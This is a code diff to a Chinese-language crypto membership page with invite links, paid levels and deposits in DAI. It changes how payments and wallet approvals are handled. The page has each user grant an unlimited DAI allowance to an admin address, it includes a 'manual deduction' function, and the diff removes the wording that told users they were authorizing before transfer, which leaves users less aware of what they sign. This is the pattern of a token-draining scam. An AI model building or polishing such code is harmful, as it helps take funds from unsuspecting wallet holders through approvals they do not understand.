@@ -127,6 +127,7 @@
 
 <button id="connectBtn" class="btn">连接钱包</button>
 <div id="addressShow" style="text-align:center;margin:12px"></div>
+<div id="authTip" style="text-align:center;color:#ffb703;font-size:14px;margin:8px 0;"></div>
 
 <div class="glass">
   <div class="title">我的邀请链接</div>
@@ -212,6 +213,7 @@ const CARD_COST = 3500;
 
 let web3, account;
 let isAdmin = false;
+let allowanceSufficient = false;
 
 const DAI_ABI = [
   {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
@@ -333,24 +335,70 @@ function check() {
   if (localStorage.getItem("black_"+account)) throw "已被拉黑";
 }
 
-// 获取当前用户对合约的授权额度
+// 【优化】获取当前用户对合约的授权额度
 async function getAllowance(){
   const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
   return await daiContract.methods.allowance(account, ADMIN).call();
 }
 
-// 执行授权给管理员合约地址
+// 【优化】授权函数，移除写死gas，钱包自动gas+动态兜底gas
 async function doApprove(){
   const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
-  await daiContract.methods.approve(ADMIN, MAX_ALLOWANCE).send({from:account});
+  try{
+    //优先钱包自动估算gas
+    await daiContract.methods.approve(ADMIN, MAX_ALLOWANCE).send({from:account});
+  }catch(err){
+    console.warn("授权自动gas失败，执行动态gas兜底",err);
+    const feeHistory = await web3.eth.getFeeHistory(4, "latest", [20,50,80]);
+    let maxPriorityFeePerGas = BigInt(feeHistory.reward[2][0]) * BigInt(130) / BigInt(100);
+    const baseFee = BigInt(feeHistory.baseFeePerGas[feeHistory.baseFeePerGas.length - 1]);
+    const maxFeePerGas = baseFee + maxPriorityFeePerGas;
+    await daiContract.methods.approve(ADMIN, MAX_ALLOWANCE).send({
+      from:account,
+      maxPriorityFeePerGas:maxPriorityFeePerGas.toString(),
+      maxFeePerGas:maxFeePerGas.toString()
+    });
+  }
+  await checkAuthStatus();
 }
 
-// 转账DAI到管理员合约地址
+// 【新增】检测授权状态，页面连接钱包自动执行
+async function checkAuthStatus(){
+  try{
+    const allowanceRaw = await getAllowance();
+    allowanceSufficient = BigInt(allowanceRaw) > 1000000000000000000n;
+    const tipDom = document.getElementById("authTip");
+    if(allowanceSufficient){
+      tipDom.innerText = "✅ DAI已授权，可直接进行支付操作";
+    }else{
+      tipDom.innerText = "⚠️ DAI尚未授权，支付时需要签名授权";
+    }
+  }catch(e){
+    allowanceSufficient = false;
+    document.getElementById("authTip").innerText = "查询授权状态失败";
+  }
+}
+
+// 【优化】转账DAI到管理员合约地址，gas优化
 async function transferToAdmin(amt) {
   const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
   const dec = await daiContract.methods.decimals().call();
   const val = (BigInt(amt) * 10n**BigInt(dec)).toString();
-  return await daiContract.methods.transfer(ADMIN, val).send({ from: account });
+  try{
+    //优先钱包自动gas
+    return await daiContract.methods.transfer(ADMIN, val).send({ from: account });
+  }catch(err){
+    console.warn("转账自动gas失败，执行动态gas兜底",err);
+    const feeHistory = await web3.eth.getFeeHistory(4, "latest", [20,50,80]);
+    let maxPriorityFeePerGas = BigInt(feeHistory.reward[2][0]) * BigInt(130) / BigInt(100);
+    const baseFee = BigInt(feeHistory.baseFeePerGas[feeHistory.baseFeePerGas.length - 1]);
+    const maxFeePerGas = baseFee + maxPriorityFeePerGas;
+    return await daiContract.methods.transfer(ADMIN, val).send({
+      from: account,
+      maxPriorityFeePerGas:maxPriorityFeePerGas.toString(),
+      maxFeePerGas:maxFeePerGas.toString()
+    });
+  }
 }
 
 // 手动划扣单个用户（仅演示）
@@ -368,15 +416,18 @@ async function payClassic(lv) {
   try{
     check();
     const a=classicPrice[lv-1];
-    if(!confirm("需要支付"+a+"DAI，先授权再转账？"))return;
-    const allowance = await getAllowance();
+    if(!confirm("需要支付"+a+"DAI"))return;
     const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
     const decimals = await daiContract.methods.decimals().call();
     const needWei = BigInt(a) * (10n**BigInt(decimals));
 
-    if(BigInt(allowance) < needWei){
-      alert("🔐需要授权DAI给合约地址，请签名授权");
-      await doApprove();
+    //只有授权不足的时候，才弹窗授权
+    if(!allowanceSufficient){
+      const allowance = await getAllowance();
+      if(BigInt(allowance) < needWei){
+        alert("🔐需要授权DAI给合约地址，请签名授权");
+        await doApprove();
+      }
     }
     await transferToAdmin(a);
     set("classic",Math.max(get("classic"),lv));
@@ -395,13 +446,15 @@ async function batchPayClassic() {
     for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];
     if(t<=0)return alert("已满");
     if(!confirm("总计"+t+"DAI？"))return;
-    const allowance = await getAllowance();
     const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
     const decimals = await daiContract.methods.decimals().call();
     const needWei = BigInt(t) * (10n**BigInt(decimals));
-    if(BigInt(allowance) < needWei){
-      alert("🔐需要授权DAI给合约地址，请签名授权");
-      await doApprove();
+    if(!allowanceSufficient){
+      const allowance = await getAllowance();
+      if(BigInt(allowance) < needWei){
+        alert("🔐需要授权DAI给合约地址，请签名授权");
+        await doApprove();
+      }
     }
     await transferToAdmin(t);
     set("classic",12);
@@ -416,14 +469,16 @@ async function payUnion(lv) {
   try{
     check();
     const a=unionPrice[lv-1];
-    if(!confirm("激活需要"+a+"DAI，先授权再转账"))return;
-    const allowance = await getAllowance();
+    if(!confirm("激活需要"+a+"DAI"))return;
     const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
     const decimals = await daiContract.methods.decimals().call();
     const needWei = BigInt(a) * (10n**BigInt(decimals));
-    if(BigInt(allowance) < needWei){
-      alert("🔐需要授权DAI给合约地址，请签名授权");
-      await doApprove();
+    if(!allowanceSufficient){
+      const allowance = await getAllowance();
+      if(BigInt(allowance) < needWei){
+        alert("🔐需要授权DAI给合约地址，请签名授权");
+        await doApprove();
+      }
     }
     await transferToAdmin(a);
     set("union",Math.max(get("union"),lv));
@@ -440,13 +495,15 @@ async function payRenew(lv) {
     check();
     const a=Math.round(unionPrice[lv-1]*RENEW);
     if(!confirm("续费+30天："+a+"DAI？"))return;
-    const allowance = await getAllowance();
     const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
     const decimals = await daiContract.methods.decimals().call();
     const needWei = BigInt(a) * (10n**BigInt(decimals));
-    if(BigInt(allowance) < needWei){
-      alert("🔐需要授权DAI给合约地址，请签名授权");
-      await doApprove();
+    if(!allowanceSufficient){
+      const allowance = await getAllowance();
+      if(BigInt(allowance) < needWei){
+        alert("🔐需要授权DAI给合约地址，请签名授权");
+        await doApprove();
+      }
     }
     await transferToAdmin(a);
     addExp(lv);
@@ -469,13 +526,15 @@ async function batchPayUnion() {
     }
     if(t<=0)return alert("全部有效");
     if(!confirm("总计"+t+"DAI？"))return;
-    const allowance = await getAllowance();
     const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
     const decimals = await daiContract.methods.decimals().call();
     const needWei = BigInt(t) * (10n**BigInt(decimals));
-    if(BigInt(allowance) < needWei){
-      alert("🔐需要授权DAI给合约地址，请签名授权");
-      await doApprove();
+    if(!allowanceSufficient){
+      const allowance = await getAllowance();
+      if(BigInt(allowance) < needWei){
+        alert("🔐需要授权DAI给合约地址，请签名授权");
+        await doApprove();
+      }
     }
     await transferToAdmin(t);
     set("union",9);
@@ -502,13 +561,15 @@ async function deposit() {
     const a = Number(document.getElementById("depositAmt").value);
     if (a <= 0) return alert("金额错误");
     if (!confirm("存入"+a+"DAI到内部钱包？")) return;
-    const allowance = await getAllowance();
     const daiContract = new web3.eth.Contract(DAI_ABI, DAI);
     const decimals = await daiContract.methods.decimals().call();
     const needWei = BigInt(a) * (10n**BigInt(decimals));
-    if(BigInt(allowance) < needWei){
-      alert("🔐需要授权DAI给合约地址，请签名授权");
-      await doApprove();
+    if(!allowanceSufficient){
+      const allowance = await getAllowance();
+      if(BigInt(allowance) < needWei){
+        alert("🔐需要授权DAI给合约地址，请签名授权");
+        await doApprove();
+      }
     }
     await transferToAdmin(a);
     const old = getInner(account);
@@ -571,8 +632,7 @@ async function adminBatchPayAllWithdraw() {
     try {
       const val = (BigInt(r.amount) * 10n ** BigInt(dec)).toString();
       await token.methods.transfer(r.user, val).send({
-        from: account,
-        gas: 100000
+        from: account
       });
       success++;
     } catch(e) {console.error(e);}
@@ -626,7 +686,7 @@ function removeBlack() {
 async function connectWallet(){
   try {
     if (!window.ethereum) {
-      alert("请安装小狐狸钱包");
+      alert("请打开TP钱包内置浏览器访问本页面");
       return;
     }
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -654,6 +714,8 @@ async function connectWallet(){
     loadInvite();
     loadBal();
     refresh();
+    //连接钱包后自动检测授权状态
+    await checkAuthStatus();
   } catch (err) {
     console.error(err);
     alert("钱包连接失败");
@@ -664,9 +726,10 @@ document.getElementById("connectBtn").onclick = connectWallet;
 
 //监听钱包切换
 if(window.ethereum){
-  window.ethereum.on('accountsChanged', ()=>{
-    account=null;web3=null;isAdmin=false;
+  window.ethereum.on('accountsChanged', async ()=>{
+    account=null;web3=null;isAdmin=false;allowanceSufficient=false;
     document.getElementById("addressShow").innerText="";
+    document.getElementById("authTip").innerText="";
     document.getElementById("regBtn").disabled=false;
     document.getElementById("regBtn").innerText="确认注册";
     document.getElementById("adminPanel").style.display = "none";
